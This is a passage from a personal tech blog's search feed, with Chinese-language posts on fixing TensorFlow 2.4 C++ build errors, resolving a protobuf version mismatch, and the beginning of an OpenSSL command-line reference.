punctuation">(</span>oneDNN<span class="token punctuation">)</span> to use the following CPU instructions <span class="token keyword">in</span> performance-critical operations:  SSE3 SSE4.1 SSE4.2AVX AVX2 FMATo <span class="token builtin class-name">enable</span> them <span class="token keyword">in</span> other operations, rebuild TensorFlow with the appropriate compiler flags.OKSession successfully created.</code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> OpenCV </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenCV </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tensorflow V2.4 C++ ç¼–è¯‘æµ‹è¯•é‡åˆ°çš„é—®é¢˜ä»¥åŠç›¸å…³è§£å†³æ–¹æ³•</title>
      <link href="/posts/fabe9f4f/"/>
      <url>/posts/fabe9f4f/</url>
      
        <content type="html"><![CDATA[<h1>tensorflow V2.4 C++ ç¼–è¯‘æµ‹è¯•é‡åˆ°çš„é—®é¢˜ä»¥åŠç›¸å…³è§£å†³æ–¹æ³•</h1><p>[TOC]</p><h2 id="fatal-error-absl-strings-string-view-h-No-such-file-or-directory">fatal error: <em>absl/strings/string_view.h:</em> <em>No</em> <em>such</em> <em>file</em> <em>or</em> <em>directory</em></h2><div class="story post-story"><p><strong>è§£å†³æ–¹æ³•:</strong></p><p>å°† <a href="https://github.com/abseil/abseil-cpp">https://github.com/abseil/abseil-cpp</a> é¡¹ç›®ä¸­ gitä¸‹æ¥, å°† <code>absl</code> ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ å¤åˆ¶åˆ° <code>tensorflow/</code> ç›®å½•ä¸‹</p><p><code>/usr/local/include/tf/tensorflow</code>  ä¸º tensorflow çš„ å¤´æ–‡ä»¶ä½ç½®</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/abseil/abseil-cpp<span class="token function">sudo</span> <span class="token function">cp</span> -r ./abseil-cpp/absl /usr/local/include/tf/tensorflow</code></pre></div><h2 id="atal-error-tensorflow-core-protobuf-error-codes-pb-h-No-such-file-or-directory">atal error: tensorflow/core/protobuf/error_codes.pb.h: No such file or directory</h2><div class="story post-story"><p><strong>è§£å†³æ–¹æ³•</strong></p><p>å…ˆæŸ¥çœ‹ tensorflow  å¤´æ–‡ä»¶ ç›®å½•ä¸‹ <code>/usr/local/include/tf/tensorflow/core/protobuf/</code>    ä¸‹æœ‰æ— æ­¤æ–‡ä»¶,</p><p>è‹¥æ— ,åˆ™æœ‰å¯èƒ½åœ¨ <code>bazel-bin/tensorflow/core/proto</code>buf ç›®å½•ä¸‹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å½“å‰åœ¨tensorflow æºç ç›®å½•ä¸‹</span><span class="token function">sudo</span> <span class="token function">cp</span> -r ./bazel-bin/tensorflow/ /usr/local/indlue/tf/tensorflow</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tensorflow ä¸Protobufç‰ˆæœ¬å¯¹åº”é—®é¢˜</title>
      <link href="/posts/a689049b/"/>
      <url>/posts/a689049b/</url>
      
        <content type="html"><![CDATA[<h1>tensorflow ä¸protobufç‰ˆæœ¬å¯¹åº”é—®é¢˜</h1><p>[TOC]</p><h2 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h2><div class="story post-story"><p>æˆ‘åœ¨å‰é¢çš„æ–‡ç« ç¼–è¯‘äº†tensorflow <strong>2.4.1</strong>ç‰ˆæœ¬, ç„¶åéšä¹‹åˆæ ¹æ®protobuf githubæ•™ç¨‹å®‰è£…äº†<strong>3.15</strong>ç‰ˆæœ¬çš„protobuf</p><p>å½“æˆ‘åœ¨ç¼–è¯‘ä»£ç å¼•å…¥tensorflow æ—¶ æç¤ºå¦‚ä¸‹é”™è¯¯:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210416225507.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210416225507.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210416225506542"></p><p>å½“æˆ‘è¿è¡Œå¦‚ä¸‹å‘½ä»¤; å¾—åˆ°protocçš„ä½ç½®,å’Œç‰ˆæœ¬ä¿¡æ¯</p><pre class="language-bash" data-language="bash"><code class="language-bash">siz@ubuntu:~$ <span class="token function">which</span> protoc/usr/local/bin/protocsiz@ubuntu:~$  protoc --versionlibprotoc <span class="token number">3.15</span>.8</code></pre><p>æŸ¥é˜…åšå®¢å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯:</p><p>(å‚è€ƒé“¾æ¥: <a href="https://blog.csdn.net/datase/article/details/82347834">https://blog.csdn.net/datase/article/details/82347834</a>)</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210416230046.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210416230046.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210416230046528"></p><p>æˆ‘æƒ³æˆ‘é‡åˆ°çš„åº”è¯¥æ˜¯ç¬¬äºŒä¸ªé—®é¢˜:</p><p>æ‰€ä»¥æˆ‘å»äº†<a href="https://github.com/tensorflow/tensorflow">tensorflow github</a> æŸ¥çœ‹äº† workspace.bzl ä¿¡æ¯: å¯¹åº”çš„ protobufçš„ç‰ˆæœ¬ä¸º3.9.2;</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210416230256.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210416230256.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210416230256366"></p></div><h2 id="å°è¯•è§£å†³">å°è¯•è§£å†³</h2><div class="story post-story"><h3 id="å¸è½½-protobuf">å¸è½½ protobuf</h3><p>==Note! å› ä¸ºä¹‹å‰ç¬¬ä¸€æ¬¡å®‰è£…protobuf é‡‡ç”¨çš„æ˜¯è¦†ç›–å®‰è£…,æ‰€ä»¥å°†Ubuntuè‡ªå¸¦çš„protobufè¦†ç›–æ‰äº†, æ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥å¸è½½æ‰æœ€æ–°çš„,é‡æ–°å®‰è£…,æ²¡æœ‰é‡‡ç”¨å…¼å®¹å®‰è£…çš„æ–¹å¼==</p><p>åˆ é™¤æ–¹å¼, è¿›å…¥åˆ°ä¸‹è½½çš„protobuf è·¯å¾„é‡Œ, é‡‡ç”¨ <strong>make uninstall</strong> æ–¹å¼</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">siz@ubuntu:~/soft$ <span class="token builtin class-name">cd</span> protobuf-3.15.8/siz@ubuntu:~/soft/protobuf-3.15.8$ <span class="token function">sudo</span> <span class="token function">make</span> uninstall<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> siz: Making uninstall <span class="token keyword">in</span> <span class="token builtin class-name">.</span>make<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Entering directory <span class="token string">'/home/siz/soft/protobuf-3.15.8'</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> <span class="token string">'/usr/local/lib/pkgconfig'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f protobuf.pc protobuf-lite.pc <span class="token punctuation">)</span>make<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Leaving directory <span class="token string">'/home/siz/soft/protobuf-3.15.8'</span>Making uninstall <span class="token keyword">in</span> srcmake<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Entering directory <span class="token string">'/home/siz/soft/protobuf-3.15.8/src'</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> <span class="token string">'/usr/local/bin'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f protoc <span class="token punctuation">)</span> /bin/bash <span class="token punctuation">..</span>/libtool   --mode<span class="token operator">=</span>uninstall <span class="token function">rm</span> -f <span class="token string">'/usr/local/lib/libprotobuf-lite.la'</span>libtool: uninstall: <span class="token function">rm</span> -f /usr/local/lib/libprotobuf-lite.la /usr/local/lib/libprotobuf-lite.a /bin/bash <span class="token punctuation">..</span>/libtool   --mode<span class="token operator">=</span>uninstall <span class="token function">rm</span> -f <span class="token string">'/usr/local/lib/libprotobuf.la'</span>libtool: uninstall: <span class="token function">rm</span> -f /usr/local/lib/libprotobuf.la /usr/local/lib/libprotobuf.a /bin/bash <span class="token punctuation">..</span>/libtool   --mode<span class="token operator">=</span>uninstall <span class="token function">rm</span> -f <span class="token string">'/usr/local/lib/libprotoc.la'</span>libtool: uninstall: <span class="token function">rm</span> -f /usr/local/lib/libprotoc.la /usr/local/lib/libprotoc.a <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> <span class="token string">'/usr/local/include'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f google/protobuf/descriptor.proto google/protobuf/any.proto google/protobuf/api.proto google/protobuf/duration.proto google/protobuf/empty.proto google/protobuf/field_mask.proto google/protobuf/source_context.proto google/protobuf/struct.proto google/protobuf/timestamp.proto google/protobuf/type.proto google/protobuf/wrappers.proto google/protobuf/compiler/plugin.proto <span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> <span class="token string">'/usr/local/include'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f google/protobuf/stubs/callback.h google/protobuf/stubs/bytestream.h google/protobuf/stubs/casts.h google/protobuf/stubs/common.h google/protobuf/stubs/hash.h google/protobuf/stubs/logging.h google/protobuf/stubs/macros.h google/protobuf/stubs/map_util.h google/protobuf/stubs/mutex.h google/protobuf/stubs/once.h google/protobuf/stubs/platform_macros.h google/protobuf/stubs/port.h google/protobuf/stubs/status.h google/protobuf/stubs/stl_util.h google/protobuf/stubs/stringpiece.h google/protobuf/stubs/strutil.h google/protobuf/stubs/template_util.h google/protobuf/any.pb.h google/protobuf/api.pb.h google/protobuf/any.h google/protobuf/arena.h google/protobuf/arena_impl.h google/protobuf/arenastring.h google/protobuf/descriptor_database.h google/protobuf/descriptor.h google/protobuf/descriptor.pb.h google/protobuf/duration.pb.h google/protobuf/dynamic_message.h google/protobuf/empty.pb.h google/protobuf/extension_set.h google/protobuf/extension_set_inl.h google/protobuf/field_mask.pb.h google/protobuf/generated_enum_reflection.h google/protobuf/generated_enum_util.h google/protobuf/generated_message_reflection.h google/protobuf/generated_message_table_driven.h google/protobuf/generated_message_util.h google/protobuf/has_bits.h google/protobuf/implicit_weak_message.h google/protobuf/io/io_win32.h google/protobuf/map_entry.h google/protobuf/map_entry_lite.h google/protobuf/map_field.h google/protobuf/map_field_inl.h google/protobuf/map_field_lite.h google/protobuf/map.h google/protobuf/map_type_handler.h google/protobuf/message.h google/protobuf/message_lite.h google/protobuf/metadata.h google/protobuf/metadata_lite.h google/protobuf/parse_context.h google/protobuf/port.h google/protobuf/port_def.inc google/protobuf/port_undef.inc google/protobuf/reflection.h google/protobuf/reflection_ops.h google/protobuf/repeated_field.h google/protobuf/service.h google/protobuf/source_context.pb.h google/protobuf/struct.pb.h google/protobuf/text_format.h google/protobuf/timestamp.pb.h google/protobuf/type.pb.h google/protobuf/unknown_field_set.h google/protobuf/wire_format.h google/protobuf/wire_format_lite.h google/protobuf/wrappers.pb.h google/protobuf/io/coded_stream.h google/protobuf/io/gzip_stream.h google/protobuf/io/printer.h google/protobuf/io/strtod.h google/protobuf/io/tokenizer.h google/protobuf/io/zero_copy_stream.h google/protobuf/io/zero_copy_stream_impl.h google/protobuf/io/zero_copy_stream_impl_lite.h google/protobuf/compiler/code_generator.h google/protobuf/compiler/command_line_interface.h google/protobuf/compiler/importer.h google/protobuf/compiler/parser.h google/protobuf/compiler/plugin.h google/protobuf/compiler/plugin.pb.h google/protobuf/compiler/cpp/cpp_generator.h google/protobuf/compiler/csharp/csharp_generator.h google/protobuf/compiler/csharp/csharp_names.h google/protobuf/compiler/java/java_generator.h google/protobuf/compiler/java/java_names.h google/protobuf/compiler/js/js_generator.h google/protobuf/compiler/js/well_known_types_embed.h google/protobuf/compiler/objectivec/objectivec_generator.h google/protobuf/compiler/objectivec/objectivec_helpers.h google/protobuf/compiler/php/php_generator.h google/protobuf/compiler/python/python_generator.h google/protobuf/compiler/ruby/ruby_generator.h google/protobuf/util/type_resolver.h google/protobuf/util/delimited_message_util.h google/protobuf/util/field_comparator.h google/protobuf/util/field_mask_util.h google/protobuf/util/json_util.h google/protobuf/util/time_util.h google/protobuf/util/type_resolver_util.h google/protobuf/util/message_differencer.h <span class="token punctuation">)</span>make<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Leaving directory <span class="token string">'/home/siz/soft/protobuf-3.15.8/src'</span>siz@ubuntu:~/soft/protobuf-3.15.8$ <span class="token function">which</span> protocsiz@ubuntu:~/soft/protobuf-3.15.8$ </code></pre>              </div>            </details><h3 id="é‡æ–°å®‰è£…protobuf">é‡æ–°å®‰è£…protobuf</h3><p>protobuf github release åœ°å€: <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p><p>ä¸‹è½½å¯¹åº”çš„3.92ç‰ˆæœ¬: å¹¶è§£å‹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> protobuf-XXX/./autogen.sh./configure <span class="token function">make</span> <span class="token function">make</span> check <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span> <span class="token function">sudo</span> ldconfig <span class="token comment"># refresh shared library cache.</span></code></pre><p>æŸ¥çœ‹ç‰ˆæœ¬ protoc --version</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210417131632.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210417131632.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210417131632662"></p><p>è‡³æ­¤å®‰è£…å®Œæˆ</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenCV </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSL ä½¿ç”¨æ‰‹å†Œ</title>
      <link href="/posts/e82eda1b/"/>
      <url>/posts/e82eda1b/</url>
      
        <content type="html"><![CDATA[<h1>OpenSSL å‘½ä»¤è¡Œè§£æ</h1><blockquote><p>ğŸ˜„ @Auther: sizaif</p><p>ğŸ“† 2021-05-09  16:32:02</p></blockquote><p>[TOC]</p><p>å‚è€ƒæ–‡æ¡£</p><p>æœåŠ¡ç«¯: <a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html">https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html</a></p><p>å®¢æˆ·ç«¯:<a href="https://www.openssl.org/docs/man1.0.2/man1/s_client.html">https://www.openssl.org/docs/man1.0.2/man1/s_client.html</a></p><p>OpenSSLå‘½ä»¤åˆ†ä¸ºä»¥ä¸‹3ä¸ªéƒ¨åˆ†ã€‚<br><img src="https://img-blog.csdn.net/20170205231250664?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2N1eXhp/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload" data-srcset="https://img-blog.csdn.net/20170205231250664?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2N1eXhp/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>æ ‡å‡†å‘½ä»¤Standard commands</p><h3 id="1-asn1parse">1.asn1parse:</h3><p>asn1parseç”¨äºè§£é‡Šç”¨ANS.1è¯­æ³•ä¹¦å†™çš„è¯­å¥(ASNä¸€èˆ¬ç”¨äºå®šä¹‰è¯­æ³•çš„æ„æˆ)</p><p>æ¼”ç¤ºå‘½ä»¤æ“ä½œé¡ºåºï¼š4 -&gt; 5 -&gt; 3 -&gt; 2-&gt; 6 -&gt; 7 -&gt;8</p><h3 id="2-ca"><a href="http://2.ca">2.ca</a>:</h3><p>caç”¨äºCAçš„ç®¡ç†.<br>ç”¨æ³•ï¼š</p><blockquote><p>openssl ca [-options]ã€‚</p></blockquote><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2.1</span><span class="token punctuation">)</span> -selfsignä½¿ç”¨å¯¹è¯ä¹¦è¯·æ±‚è¿›è¡Œç­¾åçš„å¯†é’¥å¯¹æ¥ç­¾å‘è¯ä¹¦ã€‚å³<span class="token string">"è‡ªç­¾å"</span>ï¼Œè¿™ç§æƒ…å†µå‘ç”Ÿåœ¨ç”Ÿæˆè¯ä¹¦çš„å®¢æˆ·ç«¯ã€ç­¾å‘è¯ä¹¦çš„CAéƒ½æ˜¯åŒä¸€å°æœºå™¨<span class="token punctuation">(</span>ä¹Ÿæ˜¯æˆ‘ä»¬å¤§å¤šæ•°å®éªŒä¸­çš„æƒ…å†µ<span class="token punctuation">)</span>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹æ¥è¿›è¡Œ<span class="token string">"è‡ªç­¾å"</span><span class="token number">2.2</span><span class="token punctuation">)</span> -in <span class="token function">file</span>éœ€è¦è¿›è¡Œå¤„ç†çš„PEMæ ¼å¼çš„è¯ä¹¦<span class="token number">2.3</span><span class="token punctuation">)</span> -out <span class="token function">file</span>å¤„ç†ç»“æŸåè¾“å‡ºçš„è¯ä¹¦æ–‡ä»¶<span class="token number">2.4</span><span class="token punctuation">)</span> -cert <span class="token function">file</span>ç”¨äºç­¾å‘çš„æ ¹CAè¯ä¹¦<span class="token number">2.5</span><span class="token punctuation">)</span> -days arg æŒ‡å®šç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´<span class="token number">2.6</span><span class="token punctuation">)</span> -keyfile arg   CAçš„ç§é’¥è¯ä¹¦æ–‡ä»¶<span class="token number">2.7</span><span class="token punctuation">)</span> -keyform argCAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼:    <span class="token number">2.7</span>.1<span class="token punctuation">)</span> PEM    <span class="token number">2.7</span>.2<span class="token punctuation">)</span> ENGINE <span class="token number">2.8</span><span class="token punctuation">)</span> -key arg   CAçš„æ ¹ç§é’¥è¯ä¹¦æ–‡ä»¶çš„è§£å¯†å¯†ç <span class="token punctuation">(</span>å¦‚æœåŠ å¯†äº†çš„è¯<span class="token punctuation">)</span><span class="token number">2.9</span><span class="token punctuation">)</span> -config <span class="token function">file</span>    é…ç½®æ–‡ä»¶</code></pre>              </div>            </details><h3 id="3-X-509è¯ä¹¦ç­¾å‘è¯·æ±‚-CSR-ç®¡ç†">3. X.509è¯ä¹¦ç­¾å‘è¯·æ±‚(CSR)ç®¡ç†</h3><p>ç”¨æ³•ï¼š</p><blockquote><p>openssl req [options] outfile</p></blockquote><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">3.1</span><span class="token punctuation">)</span> -inform argè¾“å…¥æ–‡ä»¶æ ¼å¼    <span class="token number">3.1</span>.1<span class="token punctuation">)</span> DER    <span class="token number">3.1</span>.2<span class="token punctuation">)</span> PEM<span class="token number">3.2</span><span class="token punctuation">)</span> -outform arg   è¾“å‡ºæ–‡ä»¶æ ¼å¼    <span class="token number">3.2</span>.1<span class="token punctuation">)</span> DER    <span class="token number">3.2</span>.2<span class="token punctuation">)</span> PEM<span class="token number">3.3</span><span class="token punctuation">)</span> -in argå¾…å¤„ç†æ–‡ä»¶<span class="token number">3.4</span><span class="token punctuation">)</span> -out argå¾…è¾“å‡ºæ–‡ä»¶<span class="token number">3.5</span><span class="token punctuation">)</span> -passin        ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶çš„è§£å¯†å¯†ç <span class="token number">3.6</span><span class="token punctuation">)</span> -key <span class="token function">file</span>ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶<span class="token number">3.7</span><span class="token punctuation">)</span> -keyform arg      <span class="token number">3.7</span>.1<span class="token punctuation">)</span> DER    <span class="token number">3.7</span>.2<span class="token punctuation">)</span> NET    <span class="token number">3.7</span>.3<span class="token punctuation">)</span> PEM<span class="token number">3.8</span><span class="token punctuation">)</span> -newæ–°çš„è¯·æ±‚<span class="token number">3.9</span><span class="token punctuation">)</span> -x509          è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦ <span class="token number">3.10</span><span class="token punctuation">)</span> -daysX509è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´  <span class="token number">3.11</span><span class="token punctuation">)</span> -newkey rsa:bits ç”Ÿæˆä¸€ä¸ªbitsé•¿åº¦çš„RSAç§é’¥æ–‡ä»¶ï¼Œç”¨äºç­¾å‘  <span class="token number">3.12</span><span class="token punctuation">)</span> -<span class="token punctuation">[</span>digest<span class="token punctuation">]</span>HASHç®—æ³•    <span class="token number">3.12</span>.1<span class="token punctuation">)</span> md5    <span class="token number">3.12</span>.2<span class="token punctuation">)</span> sha1    <span class="token number">3.12</span>.3<span class="token punctuation">)</span> md2    <span class="token number">3.12</span>.4<span class="token punctuation">)</span> mdc2    <span class="token number">3.12</span>.5<span class="token punctuation">)</span> md4<span class="token number">3.13</span><span class="token punctuation">)</span> -config <span class="token function">file</span>   æŒ‡å®šopensslé…ç½®æ–‡ä»¶<span class="token number">3.14</span><span class="token punctuation">)</span> -text: textæ˜¾ç¤ºæ ¼å¼</code></pre>              </div>            </details><h3 id="4-genrsa-ç”ŸæˆRSAå‚æ•°">4. genrsa: ç”ŸæˆRSAå‚æ•°</h3><p>ç”¨æ³•ï¼š</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">openssl genrsa <span class="token punctuation">[</span>args<span class="token punctuation">]</span> <span class="token punctuation">[</span>numbits<span class="token punctuation">]</span><span class="token number">4.1</span><span class="token punctuation">)</span> å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†:<span class="token number">4.1</span>.1<span class="token punctuation">)</span> -des: CBCæ¨¡å¼çš„DESåŠ å¯†<span class="token number">4.1</span>.2<span class="token punctuation">)</span> -des3: CBCæ¨¡å¼çš„3DESåŠ å¯†<span class="token number">4.1</span>.3<span class="token punctuation">)</span> -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯†<span class="token number">4.1</span>.4<span class="token punctuation">)</span> -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯†<span class="token number">4.1</span>.5<span class="token punctuation">)</span> -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯†<span class="token number">4.2</span><span class="token punctuation">)</span> -passout arg: argä¸ºå¯¹ç§°åŠ å¯†<span class="token punctuation">(</span>desã€3desã€aes<span class="token punctuation">)</span>çš„å¯†ç <span class="token punctuation">(</span>ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚<span class="token punctuation">)</span><span class="token number">4.3</span><span class="token punctuation">)</span> -out file: è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶<span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>: å¯†é’¥é•¿åº¦example: ç”Ÿæˆä¸€ä¸ª1024ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨3DESåŠ å¯†<span class="token punctuation">(</span>å¯†ç ä¸º123456<span class="token punctuation">)</span>ï¼Œä¿å­˜ä¸ºserver.keyæ–‡ä»¶openssl genrsa -out server.key -passout pass:123456 -des3 <span class="token number">1024</span></code></pre>              </div>            </details><h3 id="5-RSAæ•°æ®ç®¡ç†">5. RSAæ•°æ®ç®¡ç†</h3><p>ç”¨æ³•ï¼š</p><blockquote><p>openssl rsa [options] outfile</p></blockquote><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">5.1</span><span class="token punctuation">)</span> -inform argè¾“å…¥å¯†é’¥æ–‡ä»¶æ ¼å¼:    <span class="token number">5.1</span>.1<span class="token punctuation">)</span> DER<span class="token punctuation">(</span>ASN1<span class="token punctuation">)</span>    <span class="token number">5.1</span>.2<span class="token punctuation">)</span> NET    <span class="token number">5.1</span>.3<span class="token punctuation">)</span> PEM<span class="token punctuation">(</span>base64ç¼–ç æ ¼å¼<span class="token punctuation">)</span> <span class="token number">5.2</span><span class="token punctuation">)</span> -outform arg è¾“å‡ºå¯†é’¥æ–‡ä»¶æ ¼å¼    <span class="token number">5.2</span>.1<span class="token punctuation">)</span> DER    <span class="token number">5.2</span>.2<span class="token punctuation">)</span> NET    <span class="token number">5.2</span>.3<span class="token punctuation">)</span> PEM<span class="token number">5.3</span><span class="token punctuation">)</span> -in argå¾…å¤„ç†å¯†é’¥æ–‡ä»¶ <span class="token number">5.4</span><span class="token punctuation">)</span> -passin argè¾“å…¥è¿™ä¸ªåŠ å¯†å¯†é’¥æ–‡ä»¶çš„è§£å¯†å¯†é’¥<span class="token punctuation">(</span>å¦‚æœåœ¨ç”Ÿæˆè¿™ä¸ªå¯†é’¥æ–‡ä»¶çš„æ—¶å€™ï¼Œé€‰æ‹©äº†åŠ å¯†ç®—æ³•äº†çš„è¯<span class="token punctuation">)</span><span class="token number">5.5</span><span class="token punctuation">)</span> -out argå¾…è¾“å‡ºå¯†é’¥æ–‡ä»¶<span class="token number">5.6</span><span class="token punctuation">)</span> -passout arg  å¦‚æœå¸Œæœ›è¾“å‡ºçš„å¯†é’¥æ–‡ä»¶ç»§ç»­ä½¿ç”¨åŠ å¯†ç®—æ³•çš„è¯åˆ™æŒ‡å®šå¯†ç  <span class="token number">5.7</span><span class="token punctuation">)</span> -des: CBCæ¨¡å¼çš„DESåŠ å¯†<span class="token number">5.8</span><span class="token punctuation">)</span> -des3: CBCæ¨¡å¼çš„3DESåŠ å¯†<span class="token number">5.9</span><span class="token punctuation">)</span> -aes128: CBCæ¨¡å¼çš„AES128åŠ å¯†<span class="token number">5.10</span><span class="token punctuation">)</span> -aes192: CBCæ¨¡å¼çš„AES192åŠ å¯†<span class="token number">5.11</span><span class="token punctuation">)</span> -aes256: CBCæ¨¡å¼çš„AES256åŠ å¯†<span class="token number">5.12</span><span class="token punctuation">)</span> -text: ä»¥textå½¢å¼æ‰“å°å¯†é’¥keyæ•°æ® <span class="token number">5.13</span><span class="token punctuation">)</span> -noout: ä¸æ‰“å°å¯†é’¥keyæ•°æ® <span class="token number">5.14</span><span class="token punctuation">)</span> -pubin: æ£€æŸ¥å¾…å¤„ç†æ–‡ä»¶æ˜¯å¦ä¸ºå…¬é’¥æ–‡ä»¶<span class="token number">5.15</span><span class="token punctuation">)</span> -pubout: è¾“å‡ºå…¬é’¥æ–‡ä»¶</code></pre>              </div>            </details><h3 id="6-x509">6. x509</h3><p>openssl x509æ˜¯ä¸€ä¸ªåŠŸèƒ½å¾ˆä¸°å¯Œçš„è¯ä¹¦å¤„ç†å·¥å…·ã€‚å¯ä»¥ç”¨æ¥æ˜¾ç¤ºè¯ä¹¦çš„å†…å®¹ï¼Œè½¬æ¢å…¶æ ¼å¼ï¼Œç»™CSRç­¾åç­‰X.509è¯ä¹¦çš„ç®¡ç†å·¥ä½œ<br>ç”¨æ³•ï¼š</p><blockquote><p>openssl x509 [args]</p></blockquote><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">6.1</span><span class="token punctuation">)</span> -inform argå¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶æ ¼å¼    <span class="token number">6.1</span>.1<span class="token punctuation">)</span> DER    <span class="token number">6.1</span>.2<span class="token punctuation">)</span> NET    <span class="token number">6.1</span>.3<span class="token punctuation">)</span> PEM<span class="token number">6.2</span><span class="token punctuation">)</span> -outform arg   å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶æ ¼å¼    <span class="token number">6.2</span>.1<span class="token punctuation">)</span> DER    <span class="token number">6.2</span>.2<span class="token punctuation">)</span> NET    <span class="token number">6.2</span>.3<span class="token punctuation">)</span> PEM<span class="token number">6.3</span><span class="token punctuation">)</span> -in arg 